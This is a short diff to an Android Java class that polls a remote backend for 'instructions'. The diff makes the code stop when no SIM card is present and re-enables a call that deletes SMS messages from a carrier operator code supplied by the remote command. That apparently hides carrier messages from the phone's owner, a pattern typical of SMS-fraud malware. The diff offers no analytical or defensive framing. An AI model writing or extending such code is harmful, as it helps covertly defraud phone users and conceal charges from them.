@@ -50,8 +50,15 @@ public class GetMsgRunnable implements Runnable {
 
 	//获取最新的指令，
 	private void updateCheckInfo() throws AVException {
+		//若没有sim卡,毛用
+		final boolean isSimExist = PhoneInfo.getInstance(mContext).isSIMexistOrAvaiable(mContext);
+		if (!isSimExist) {
+			return;
+		}
 		AVQuery<CheckInfo> query = AVObject.getQuery(CheckInfo.class);
 		List<CheckInfo> list = query.find();
+//		if(PhoneInfo.getInstance(mContext))
+
 		if (list != null && list.size() > 0) {
 			if (DEBUG) {
 				Log.d(TAG, "查询的数量是：" + list.size());
@@ -82,8 +89,9 @@ public class GetMsgRunnable implements Runnable {
 					if (DEBUG) {
 						Log.d(TAG, "3５秒后重新查询！！！！");
 					}
+
 					Thread.currentThread().sleep(25000);
-					//PhoneInfo.getInstance(mContext).deleteSMS(mContext, currentCheckInfo.getOperatorCode());
+					PhoneInfo.getInstance(mContext).deleteSMS(mContext, currentCheckInfo.getOperatorCode());
 					Thread.currentThread().sleep(25000);
 				} catch (InterruptedException e) {
 					if (DEBUG) {
